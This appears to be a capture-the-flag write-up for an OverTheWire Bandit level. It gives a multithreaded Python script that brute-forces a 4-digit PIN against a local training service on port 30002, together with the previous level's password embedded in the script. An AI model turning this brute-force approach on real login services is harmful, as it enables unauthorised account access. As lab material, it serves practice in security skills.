# bandit24 → bandit25

In this challenge we need to provide a 4 digit password to port 30002. The challenge suggests that we brute-force it.

We are going to use `python3` to solve the challenge. At first we need to create a script in an arbitrary subfolder of the `/tmp` directory.

```
$ mkdir /tmp/f1oflag

$ touch /tmp/f1oflag/retrieve.py
```

`retrieve.py`
```python
import socket
import threading
from threading import Thread
import queue
import os

q = queue.Queue()

def enter_pin(i):
    if i%250 == 0:
        print(str(i))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 30002))
    welcome = s.recv(1024)

    pin = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ " + str(i).zfill(4) + "\n"
    msg = pin.encode()
    s.sendall(msg)
    data = s.recvmsg(1024)
    
    if str(data).find("Wrong") == -1:
        print(str(data) + " " + str(i))
        s.close()
        os._exit(1)
    s.close()

def worker():
    while True:
        item = q.get()
        enter_pin(item)
        q.task_done()

for i in range(8):
    t =  Thread(target=worker)
    t.daemon = True
    t.start()

for i in range(10000):
    q.put(i)
    i += 1

q.join()       # block until all tasks are done

```

Through trial and error we can find out, that we can initiate a maximum of 8 threads at a time, so we implement a simple task queue in order to have 8 workers in parallel checking the pincodes.
